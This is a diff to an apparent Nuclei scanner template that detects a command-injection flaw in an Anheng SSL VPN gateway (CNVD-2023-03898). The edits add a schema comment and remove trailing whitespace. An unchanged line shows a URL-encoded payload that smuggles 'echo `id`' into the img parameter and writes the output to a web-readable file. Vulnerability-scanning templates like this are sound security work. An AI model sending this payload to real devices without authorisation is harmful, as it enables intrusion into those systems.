@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: anheng-gateway-rce-cnvd-2023-03898
 
 info:
@@ -17,7 +18,7 @@ http:
       - "{{BaseURL}}/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp%7Cecho%20%60id%60%20%7Ctee%20/usr/local/webui/test"
       - "{{BaseURL}}/test"
 
-    stop-at-first-match: true    
+    stop-at-first-match: true
     matchers-condition: and
     matchers:
       - type: regex
